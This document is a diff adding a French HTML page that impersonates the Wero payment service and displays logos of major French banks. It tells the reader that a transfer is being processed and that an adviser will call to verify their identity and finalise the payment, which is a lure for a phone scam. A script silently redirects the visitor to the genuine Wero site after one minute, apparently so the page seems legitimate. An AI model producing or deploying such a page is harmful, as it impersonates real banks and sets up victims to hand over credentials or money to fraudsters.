@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Wero - Confirmation</title>
+    
+    <style>
+        :root { --jaune-fond: #ffe680; --jaune-accent: #fff4c2; }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:var(--jaune-fond); min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; color:#1a1a1a; padding:20px; text-align:center; }
+        .container { max-width:520px; margin:0 auto; background:white; border-radius:16px; box-shadow:0 10px 40px rgba(0,0,0,0.12); overflow:hidden; padding:40px 24px; }
+        .header { background:var(--jaune-accent); padding:25px; border-radius:16px 16px 0 0; margin:-40px -24px 40px; display:flex; align-items:center; justify-content:flex-start; }
+        .logo-img { width:60px; height:60px; margin-left:20px; object-fit:contain; }
+        .main-image { width:100%; max-width:340px; margin:0 auto 40px; border-radius:16px; box-shadow:0 8px 25px rgba(0,0,0,0.15); }
+        .message { font-size:1.05rem; line-height:1.7; color:#333; margin:0 10px 40px; text-align:left; }
+        .partners-title { font-size:0.95rem; color:#666; margin:30px 0 15px; }
+        .partners-logos { display:grid; grid-template-columns:repeat(auto-fit,minmax(80px,1fr)); gap:12px; max-width:420px; margin:0 auto; }
+        .logo-item { width:80px; height:50px; margin:0 auto; display:flex; align-items:center; justify-content:center; background:white; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.08); padding:8px; }
+        .logo-item img { max-width:100%; max-height:100%; object-fit:contain; }
+        .footer { font-size:0.85rem; color:#777; margin-top:40px; line-height:1.6; }
+        .footer a { color:#0066cc; margin:0 8px; text-decoration:none; }
+        .footer a:hover { text-decoration:underline; }
+        @media (max-width:480px) { .container {padding:30px 16px;} .main-image {max-width:280px;} .partners-logos {grid-template-columns:repeat(auto-fit,minmax(70px,1fr));gap:10px;} .logo-item {width:70px;height:45px;padding:6px;} .logo-img {width:50px;height:50px;margin-left:15px;} }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <img src="https://i.postimg.cc/3rvSQHBz/IMG-7193.jpg" alt="Logo" class="logo-img">
+        </div>
+        
+        <img src="https://i.postimg.cc/yYJptyw4/IMG-7170.png" alt="Conseiller Wero" class="main-image">
+        
+        <div class="message">
+            Madame, Monsieur,<br><br>
+            Nous vous informons que votre virement est actuellement en cours de traitement.<br><br>
+            Dans le cadre de nos procédures de sécurité visant à éviter toute arnaque, un conseiller Wero prendra contact avec vous par téléphone dans les plus brefs délais. L'objectif de cet appel est de vérifier votre identité et de finaliser le versement sur votre compte bancaire.<br><br>
+            Nous vous remercions pour votre compréhension et votre coopération.<br><br>
+            Cordialement,<br>
+            L'équipe Wero
+        </div>
+        
+        <div class="partners">
+            <div class="partners-title">Ce service vous est proposé par :</div>
+            <div class="partners-logos">
+                <div class="logo-item"><img src="https://i.postimg.cc/sgmvS1XN/agricole.png" alt="Crédit Agricole"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/dQhHxycG/bnp.png" alt="BNP Paribas"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/28vHzN66/caisse.png" alt="Caisse d'Épargne"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/2SD0y9bx/cic.png" alt="CIC"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/859HSZgM/hello.png" alt="Arkéa"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/y63jPC0P/lcl.png" alt="LCL"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/Gh0QggQ1/arkea.png" alt="Arkéa"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/YCMxM4Zn/mutuel.png" alt="Crédit Mutuel"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/nh2GzFtH/postal.png" alt="La Banque Postale"></div>
+                <div class="logo-item"><img src="https://i.postimg.cc/zffSHsJT/societe.png" alt="Société Générale"></div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Mentions légales</a> | 
+            <a href="#">FAQ</a> | 
+            <a href="#">CGU</a> | 
+            <a href="#">Cookies et données</a> | 
+            <a href="#">Se désinscrire</a>
+        </div>
+    </div>
+
+    <script>
+        // Redirection silencieuse après exactement 1 minute (60 000 ms)
+        setTimeout(function() {
+            window.location.href = 'https://wero-wallet.eu';
+        }, 60000);
+    </script>
+
+</body>
+</html>
